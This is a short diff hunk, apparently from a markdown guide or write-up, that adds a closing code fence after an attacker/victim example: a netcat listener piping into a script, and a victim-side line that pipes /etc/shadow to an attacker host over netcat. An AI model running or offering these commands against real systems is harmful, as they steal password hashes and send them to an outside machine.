@@ -22,3 +22,4 @@ nc -lvnp 1234 | ./etcshash.sh
 
 # victim:
 cat /etc/shadow | nc $ATTACKER 1234
+```
